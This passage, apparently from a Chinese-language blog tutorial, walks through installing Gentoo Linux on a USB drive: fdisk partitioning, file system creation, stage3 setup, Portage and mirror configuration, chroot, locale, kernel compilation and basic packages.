bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>):g</span><br><span class="line"></span><br><span class="line">Created a new GPT disklabel (GUID: 87EA4497-2722-DF43-A954-368E46AE5C5F).</span><br></pre></td></tr></table></figure><p>如果当前存在其他的分区,可以选择将分区删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>):d</span><br><span class="line"></span><br><span class="line">Partition number (1-4): 1</span><br></pre></td></tr></table></figure><p>创建一个efi分区,大小建议256MB</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>):n</span><br><span class="line"></span><br><span class="line">Partition number (1-128, default 1): 1</span><br><span class="line">First sector (2048-60549086, default 2048): </span><br><span class="line">Last sector, +/-sectors or +/-size&#123;K,M,G,T,P&#125; (2048-60549086, default 60549086): +256M</span><br><span class="line"> </span><br><span class="line">Created a new partition 1 of <span class="built_in">type</span> <span class="string">&#x27;Linux filesystem&#x27;</span> and of size 256 MiB.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>):t</span><br><span class="line"></span><br><span class="line">Selected partition 1</span><br><span class="line">Partition <span class="built_in">type</span> (<span class="built_in">type</span> L to list all types): 1</span><br><span class="line">Changed <span class="built_in">type</span> of partition <span class="string">&#x27;Linux filesystem&#x27;</span> to <span class="string">&#x27;EFI System&#x27;</span>.</span><br></pre></td></tr></table></figure><p>创建一个swap分区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>):n</span><br><span class="line"></span><br><span class="line">Partition number (2-128, default 2): </span><br><span class="line">First sector (526336-60549086, default 526336): </span><br><span class="line">Last sector, +/-sectors or +/-size&#123;K,M,G,T,P&#125; (526336-60549086, default 60549086): +4G</span><br><span class="line"> </span><br><span class="line">Created a new partition 2 of <span class="built_in">type</span> <span class="string">&#x27;Linux filesystem&#x27;</span> and of size 4 GiB.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>):t</span><br><span class="line"></span><br><span class="line">Partition number (1,2, default 2): 2</span><br><span class="line">Partition <span class="built_in">type</span> (<span class="built_in">type</span> L to list all types): 19</span><br><span class="line"> </span><br><span class="line">Changed <span class="built_in">type</span> of partition <span class="string">&#x27;Linux filesystem&#x27;</span> to <span class="string">&#x27;Linux swap&#x27;</span>.</span><br></pre></td></tr></table></figure><p>创建主分区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>):p</span><br><span class="line"></span><br><span class="line">Disk /dev/sda: 28.89 GiB, 31001149440 bytes, 60549120 sectors</span><br><span class="line">Disk model: DataTraveler 2.0</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: gpt</span><br><span class="line">Disk identifier: 87EA4497-2722-DF43-A954-368E46AE5C5F</span><br><span class="line"> </span><br><span class="line">Device       Start      End  Sectors  Size Type</span><br><span class="line">/dev/sda1     2048   526335   524288  256M EFI System</span><br><span class="line">/dev/sda2   526336  8914943  8388608    4G Linux swap</span><br><span class="line">/dev/sda3  8914944 60549086 51634143 24.6G Linux filesystem</span><br></pre></td></tr></table></figure><p>将分区信息写入磁盘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>):w</span><br></pre></td></tr></table></figure><p>当前磁盘分区信息</p><table><thead><tr><th>分区</th><th>详细信息</th></tr></thead><tbody><tr><td>&#x2F;dev&#x2F;sda1</td><td>启动分区</td></tr><tr><td>&#x2F;dev&#x2F;sda2</td><td>swap分区</td></tr><tr><td>&#x2F;dev&#x2F;sda3</td><td>根分区</td></tr></tbody></table><h4 id="4-创建文件系统"><a href="#4-创建文件系统" class="headerlink" title="4.创建文件系统"></a>4.创建文件系统</h4><p>boot分区文件系统一般考虑兼容性使用fat文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.vfat /dev/sda1</span><br></pre></td></tr></table></figure><p>swap分区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkswap /dev/sda2</span><br></pre></td></tr></table></figure><p>根分区,可采用(ext3&#x2F;4 xfs btrfs ntfs jfs…..)使用非ext文件系统在后面编译linux内核的时候要启动linux内核对该文件系统的支持</p><p>这里采用btrfs文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.btrfs /dev/sda3</span><br></pre></td></tr></table></figure><h4 id="5-分区挂载"><a href="#5-分区挂载" class="headerlink" title="5.分区挂载"></a>5.分区挂载</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将/dev/sda3主磁盘分区挂载到/mnt/gentoo下面</span></span><br><span class="line">mount /dev/sda3 /mnt/gentoo</span><br></pre></td></tr></table></figure><h4 id="6-安装stage3包"><a href="#6-安装stage3包" class="headerlink" title="6.安装stage3包"></a>6.安装stage3包</h4><p>stage3包提供了最基本的portage包管理器编译工具链和一些最基本的链接库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取Gentoo stage3包</span></span><br><span class="line">wget https://bouncer.gentoo.org/fetch/root/all/releases/amd64/autobuilds/20220109T170538Z/stage3-amd64-systemd-20220109T170538Z.tar.xz</span><br><span class="line">tar -Jxf stage3-amd64-systemd-20220109T170538Z.tar.xz -C /mnt/gentoo</span><br><span class="line"></span><br><span class="line"><span class="comment">#将之前格式化的boot磁盘挂载</span></span><br><span class="line">mount /dev/sda1 /mnt/gentoo/boot</span><br></pre></td></tr></table></figure><h4 id="7-基本编译环境准备"><a href="#7-基本编译环境准备" class="headerlink" title="7.基本编译环境准备"></a>7.基本编译环境准备</h4><h5 id="1-配置编译portage编译软件的参数"><a href="#1-配置编译portage编译软件的参数" class="headerlink" title="1.配置编译portage编译软件的参数"></a>1.配置编译portage编译软件的参数</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">nano /mnt/gentoo/etc/portage/make.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># These settings were set by the catalyst build script that automatically</span></span><br><span class="line"><span class="comment"># built this stage.</span></span><br><span class="line"><span class="comment"># Please consult /usr/share/portage/config/make.conf.example for a more</span></span><br><span class="line"><span class="comment"># detailed example.</span></span><br><span class="line">COMMON_FLAGS=<span class="string">&quot;-march=native -O3 -pipe -fstack-protector-strong&quot;</span> <span class="comment">#设置编译参数(-march=native可以根据cpu指令集进行优化,-O3优化级别)</span></span><br><span class="line">CFLAGS=<span class="string">&quot;<span class="variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span>    <span class="comment">#C编译参数</span></span><br><span class="line">CXXFLAGS=<span class="string">&quot;<span class="variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span>  <span class="comment">#C++编译参数</span></span><br><span class="line">FCFLAGS=<span class="string">&quot;<span class="variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span></span><br><span class="line">FFLAGS=<span class="string">&quot;<span class="variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span></span><br><span class="line">ACCEPT_KEYWORDS=<span class="string">&quot;amd64&quot;</span>  <span class="comment">#可接受的软件包等级(稳定与不稳定)(这里为全局keyworkds,若想为特定软件包指定特定的Keyworkds(可以在/etc/protage/portage.accpet_keywords</span></span><br><span class="line">ACCEPT_LICENSE=<span class="string">&quot;*&quot;</span>      <span class="comment">#可接受的软件包许可证</span></span><br><span class="line">MAKEOPTS=<span class="string">&quot;-j8 -l7.2&quot;</span>    <span class="comment">#根据cpu核心数来配置(一般配置为cpu核心数+1),如果机器配置不够尽量将线程数调低一些,方式内存爆.</span></span><br><span class="line"></span><br><span class="line">CHOST=<span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"><span class="comment">#--keep-going表示portage在编译软件出错的时候继续进行编译--with-bdeps表示在碰上依赖的时候一起安装上依赖</span></span><br><span class="line">EMERGE_DEFAULT_OPTS=<span class="string">&quot;--jobs=8 --load-average=7.2 --ask --keep-going --with-bdeps=y&quot;</span></span><br><span class="line">GRUB_PLATFORMS=<span class="string">&quot;efi-64&quot;</span> <span class="comment">#配置GRUB架构平台</span></span><br><span class="line">CPU_FLAGS_X86=<span class="string">&quot;&quot;</span><span class="comment">#使用cpuflags查看cpu参数</span></span><br><span class="line"><span class="comment">#设置语言</span></span><br><span class="line">L10N=<span class="string">&quot;en-US en&quot;</span></span><br><span class="line">LINGUAS=<span class="string">&quot;en-US en&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#镜像源</span></span><br><span class="line">NETEASE=<span class="string">&quot;https://mirrors.163.com/gentoo/&quot;</span></span><br><span class="line">NEUSOFT=<span class="string">&quot;https://mirrors.neusoft.edu.cn/gentoo/&quot;</span></span><br><span class="line">TSINGHUA=<span class="string">&quot;https://mirrors.tuna.tsinghua.edu.cn/gentoo/&quot;</span></span><br><span class="line">CDS=<span class="string">&quot;http://mirrors.yun-idc.com/gentoo/&quot;</span></span><br><span class="line">ALI=<span class="string">&quot;https://mirrors.aliyun.com/gentoo/&quot;</span></span><br><span class="line">BIT=<span class="string">&quot;https://mirror.bit.edu.cn/gentoo/&quot;</span></span><br><span class="line">USTC=<span class="string">&quot;https://mirrors.ustc.edu.cn/gentoo/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTO_CLEAN=<span class="string">&quot;yes&quot;</span></span><br><span class="line"><span class="comment">#设置自动清理</span></span><br><span class="line">VIDEO_CARDS=<span class="string">&quot;intel nvidia&quot;</span><span class="comment">#配置显卡驱动</span></span><br><span class="line">INPUT_DEVICES=<span class="string">&quot;libinput&quot;</span>            <span class="comment">#配置输入设备的基本库</span></span><br><span class="line"><span class="comment">#将microcode直接编译进内核</span></span><br><span class="line">MICROCODE_SIGNATURES=<span class="string">&quot;-S&quot;</span></span><br><span class="line">LC_MESSAGES=C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PORTDIR=<span class="string">&quot;/var/db/repos/gentoo&quot;</span>      <span class="comment">#软件包的ebuild文件存储目录</span></span><br><span class="line">DISTDIR=<span class="string">&quot;/var/cache/distfiles&quot;</span></span><br><span class="line">PKGDIR=<span class="string">&quot;/var/cache/binpkgs&quot;</span>         <span class="comment">#软件包的存储目录</span></span><br><span class="line"><span class="comment">#设置软件包缓存目录</span></span><br><span class="line">PORTAGE_TMPDIR=<span class="string">&quot;/tmp&quot;</span>               <span class="comment">#portage的编译目录</span></span><br><span class="line"><span class="comment">#设置portage构建软件包目录(如果内存较大,建议设置在内存里面)</span></span><br><span class="line"><span class="comment"># This sets the language of build output to English.</span></span><br><span class="line"><span class="comment"># Please keep this setting intact when reporting bugs.</span></span><br><span class="line">LC_MESSAGES=C</span><br><span class="line">GENTOO_MIRRORS=<span class="string">&quot;<span class="variable">$&#123;USTC&#125;</span>&quot;</span>            <span class="comment">#配置Gentoo镜像源(软件镜像源)</span></span><br><span class="line"><span class="comment">#全局USE</span></span><br><span class="line">USE=<span class="string">&quot;-X -qt5 &quot;</span></span><br></pre></td></tr></table></figure><h5 id="2-配置gentoo软件仓库"><a href="#2-配置gentoo软件仓库" class="headerlink" title="2.配置gentoo软件仓库"></a>2.配置gentoo软件仓库</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建存放gentoo仓库配置文件的目录</span></span><br><span class="line"><span class="built_in">mkdir</span> --parents /mnt/gentoo/etc/portage/repos.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#将gentoo软件仓库配置模板拷贝至上述创建的目录下</span></span><br><span class="line"><span class="built_in">cp</span> /mnt/gentoo/usr/share/portage/config/repos.conf /mnt/gentoo/etc/portage/repos.conf/gentoo.conf</span><br></pre></td></tr></table></figure><p>配置仓库镜像源(获取ebuild的镜像源)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /mnt/gentoo/etc/portage/repos.conf/gentoo.conf</span><br></pre></td></tr></table></figure><p>将镜像源换成国内的中科大gentoo源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">main-repo = gentoo</span><br><span class="line"> </span><br><span class="line">[gentoo]</span><br><span class="line">location = /var/db/repos/gentoo</span><br><span class="line">sync-type = rsync</span><br><span class="line">sync-uri = rsync://mirrors.ustc.edu.cn/gentoo-portage</span><br><span class="line">auto-sync = <span class="built_in">yes</span></span><br><span class="line">sync-rsync-verify-jobs = 1</span><br><span class="line">sync-rsync-verify-metamanifest = <span class="built_in">yes</span></span><br><span class="line">sync-rsync-verify-max-age = 24</span><br><span class="line">sync-openpgp-key-path = /usr/share/openpgp-keys/gentoo-release.asc</span><br><span class="line">sync-openpgp-key-refresh-retry-count = 40</span><br><span class="line">sync-openpgp-key-refresh-retry-overall-timeout = 1200</span><br><span class="line">sync-openpgp-key-refresh-retry-delay-exp-base = 2</span><br><span class="line">sync-openpgp-key-refresh-retry-delay-max = 60</span><br><span class="line">sync-openpgp-key-refresh-retry-delay-mult = 4</span><br></pre></td></tr></table></figure><h5 id="3-挂载必要的文件系统"><a href="#3-挂载必要的文件系统" class="headerlink" title="3.挂载必要的文件系统"></a>3.挂载必要的文件系统</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置dns解析文件</span></span><br><span class="line"><span class="built_in">cp</span> --dereference /etc/resolv.conf /mnt/gentoo/etc/resolv.conf</span><br><span class="line"></span><br><span class="line">mount --types proc /proc /mnt/gentoo/proc</span><br><span class="line">mount --rbind /sys /mnt/gentoo/sys</span><br><span class="line">mount --make-rslave /mnt/gentoo/sys</span><br><span class="line">mount --rbind /dev /mnt/gentoo/dev</span><br><span class="line">mount --make-rslave /mnt/gentoo/dev</span><br><span class="line"><span class="comment">#假如用的不是gentoo的livecd,需要加入以下</span></span><br><span class="line"><span class="built_in">test</span> -L /dev/shm &amp;&amp; <span class="built_in">rm</span> /dev/shm &amp;&amp; <span class="built_in">mkdir</span> /dev/shm</span><br><span class="line">mount --types tmpfs --options nosuid,nodev,noexec shm /dev/shm</span><br><span class="line"><span class="built_in">chmod</span> 1777 /dev/shm</span><br></pre></td></tr></table></figure><h5 id="4-进入到新的系统进行基本系统配置"><a href="#4-进入到新的系统进行基本系统配置" class="headerlink" title="4.进入到新的系统进行基本系统配置"></a>4.进入到新的系统进行基本系统配置</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chroot</span> /mnt/gentoo /bin/bash</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="built_in">export</span> PS1=<span class="string">&quot;(chroot)<span class="variable">$&#123;PS1&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><h4 id="8-开始整个系统的编译"><a href="#8-开始整个系统的编译" class="headerlink" title="8.开始整个系统的编译"></a>8.开始整个系统的编译</h4><h5 id="1-获取ebuild快照"><a href="#1-获取ebuild快照" class="headerlink" title="1.获取ebuild快照"></a>1.获取ebuild快照</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emerge-webrsync</span><br></pre></td></tr></table></figure><h5 id="2-获取系统的配置文件"><a href="#2-获取系统的配置文件" class="headerlink" title="2.获取系统的配置文件"></a>2.获取系统的配置文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root <span class="comment">#eselect profile list</span></span><br><span class="line"></span><br><span class="line">Available profile symlink targets:</span><br><span class="line">  [1]   default/linux/amd64/17.1 *</span><br><span class="line">  [2]   default/linux/amd64/17.1/desktop</span><br><span class="line">  [3]   default/linux/amd64/17.1/desktop/gnome</span><br><span class="line">  [4]   default/linux/amd64/17.1/desktop/kde</span><br></pre></td></tr></table></figure><h5 id="3-安装一些常用的软件"><a href="#3-安装一些常用的软件" class="headerlink" title="3.安装一些常用的软件"></a>3.安装一些常用的软件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emerge --ask app-portage/cpuid2cpuflags<span class="comment">#用于查看cpu参数,可以将参数配置到portage配置文件中使得可以针对cpu参数进行优化</span></span><br></pre></td></tr></table></figure><h5 id="4-配置USE标签"><a href="#4-配置USE标签" class="headerlink" title="4.配置USE标签"></a>4.配置USE标签</h5><p>USE标记是Gentoo中用于配置特定软件包如何编译,一般分为全局USE和特定软件包USE<br>(&#x2F;etc&#x2F;portage&#x2F;package.use&#x2F;*特定软件包,&#x2F;etc&#x2F;portage&#x2F;make.conf全局USE)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sys-devel/gcc cet pgo go lto nptl -objc -objc++ -objc-gc -fixed-point -d</span><br><span class="line">sys-devel/gdb cet lzma multitarget python server source-highlight xml xxhash</span><br><span class="line">sys-devel/clang static-analyzer</span><br><span class="line">dev-lang/python -bluetooth -wininst</span><br><span class="line">net-analyze/nmap nse nping ncat libssh2</span><br><span class="line">app-containers/docker btrfs cli apparmor aufs container-init device-mapper overlay</span><br><span class="line">app-editors/vim cscope racket -X -crypt  -terminal</span><br><span class="line">net-misc/wget cookie-check</span><br><span class="line">net-wireless/wpa_supplicant ap -broadcom-sta -crda eap-sim -eapol-test -mesh -p2p</span><br><span class="line">openjdk -headless-awt</span><br><span class="line">git blksha1 -cgi -highlight -webdav -mediawiki -mediawiki-experimental -perforce subversion -tk</span><br><span class="line">openssh X509 hpn ldns livecd scp ssl xmss security-key</span><br></pre></td></tr></table></figure><h5 id="5-设置时间和地区"><a href="#5-设置时间和地区" class="headerlink" title="5.设置时间和地区"></a>5.设置时间和地区</h5><p>配置时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<span class="comment">#将时间配置到上海时区</span></span><br><span class="line">hwclock --systohc<span class="comment">#同步时间</span></span><br></pre></td></tr></table></figure><p>配置语言和地区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/etc/locale.gen</span></span><br><span class="line">en_US.UTF-8 UTF-8</span><br><span class="line">zh_CN.UTF-8 UTF-8</span><br><span class="line">locale-gen</span><br><span class="line"></span><br><span class="line"><span class="comment">#列出所有可用的locale</span></span><br><span class="line">root <span class="comment">#eselect locale list</span></span><br><span class="line"></span><br><span class="line">Available targets <span class="keyword">for</span> the LANG variable:</span><br><span class="line">  [1]  C</span><br><span class="line">  [2]  C.utf8</span><br><span class="line">  [3]  en_US</span><br><span class="line">  [4]  en_US.iso88591</span><br><span class="line">  [5]  en_US.utf8</span><br><span class="line">  [6]  de_DE</span><br><span class="line">  [7]  de_DE.iso88591</span><br><span class="line">  [8]  de_DE.iso885915</span><br><span class="line">  [9]  de_DE.utf8</span><br><span class="line">  [10] POSIX</span><br><span class="line">  [ ]  (free form)</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置locale</span></span><br><span class="line">root <span class="comment">#eselect locale set 9</span></span><br></pre></td></tr></table></figure><p>配置主机名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostnamectl set-hostname Gentoo</span><br></pre></td></tr></table></figure><p>配置hosts文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/hosts</span><br><span class="line"><span class="comment"># This defines the current system and must be set</span></span><br><span class="line">127.0.0.1     tux.homenetwork tux localhost</span><br><span class="line">  </span><br><span class="line"><span class="comment"># Optional definition of extra systems on the network</span></span><br><span class="line">192.168.0.5   jenny.homenetwork jenny</span><br><span class="line">192.168.0.6   benny.homenetwork benny</span><br></pre></td></tr></table></figure><h5 id="6-安装linux-firmware和microcode"><a href="#6-安装linux-firmware和microcode" class="headerlink" title="6.安装linux-firmware和microcode"></a>6.安装linux-firmware和microcode</h5><p>linux-firmware包含了常用的网卡和显卡驱动,microcode是微码器,一般用于更新微码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">emerge --ask --verbose sys-kernel/linux-firmware sys-firmware/intel-microcode</span><br><span class="line"><span class="comment">#sys-kernel/linux-firmware      包含了一些常用的驱动</span></span><br><span class="line"><span class="comment">#sys-firmware/intel-microcode   用于更新microcode,以保持系统的稳定性</span></span><br></pre></td></tr></table></figure><h5 id="7-编译内核"><a href="#7-编译内核" class="headerlink" title="7.编译内核"></a>7.编译内核</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取内核源码</span></span><br><span class="line">emerge --ask sys-kernel/gentoo-sources sys-kernel/dracut sys-apps/pciutils</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys-kernel/gentoo-sources 为内核源码</span></span><br><span class="line"><span class="comment">#sys-kernel/dracut用与生成initramfs</span></span><br><span class="line"><span class="comment">#sys-apps/pciutils软件包用于收集硬件信息(一些pci设备)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#列出当前可用内核</span></span><br><span class="line">eselect kernel list</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置使用那个内核</span></span><br><span class="line">eselect kernel <span class="built_in">set</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#编译内核</span></span><br><span class="line"><span class="comment">#进入内核目录</span></span><br><span class="line"><span class="built_in">cd</span> /usr/src/linux</span><br><span class="line"></span><br><span class="line"><span class="comment">#开始编译</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置编译选项</span></span><br><span class="line">make menuconfig</span><br><span class="line"></span><br><span class="line"><span class="comment">#开始编译</span></span><br><span class="line">make -j8 &amp;&amp; make modules_install -j8</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装内核</span></span><br><span class="line">make install </span><br><span class="line"></span><br><span class="line"><span class="comment">#生成一个initramfs</span></span><br><span class="line">dracut --kver=5.15.80-gentoo</span><br><span class="line"><span class="comment">#记得打开frame_buffer(大坑)。</span></span><br></pre></td></tr></table></figure><h5 id="8-系统基本使用的软件"><a href="#8-系统基本使用的软件" class="headerlink" title="8.系统基本使用的软件"></a>8.系统基本使用的软件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">emerge --ask --verbose net-wireless/iw net-wireless/wpa_supplicant  net-misc/dhcp net-dns/dnsmasq sys-boot/grub:2 app-editors/vim sys-boot/efibootmgr</span><br><span class="line"><span class="comment">#net-wireeless/iw               一个网络管理工具</span></span><br><span class="line"><span class="comment">#net-wireless/wpa-supplicant    wifi连接工具</span></span><br><span class="line"><span class="comment">#net-misc/networkmanager        网络管理工具</span></span><br><span class="line"><span class="comment">#net-misc/dhcp                  dhcp客户端</span></span><br><span class="line"><span class="comment">#net-misc/dnsmasq               dns服务器以及dhcp服务器</span></span><br><span class="line"><span class="comment">#app-admin/sysklogd             日志分析工具</span></span><br><span class="line"><span class="comment">#sys-boot/grub:2                grub(一种bootloader)</span></span><br><span class="line"><span class="comment">#app-editors/vim vim编辑器</span></span><br><span class="line"><span class="comment">#sys-boot/efibootmgruefi系统引导必要的</span></span><br></pre></td></tr></table></figure><h5 id="9-更新系统"><a href="#9-更新系统" class="headerlink" title="9.更新系统"></a>9.更新系统</h5><figure class="highlight bash"><table><tr><td 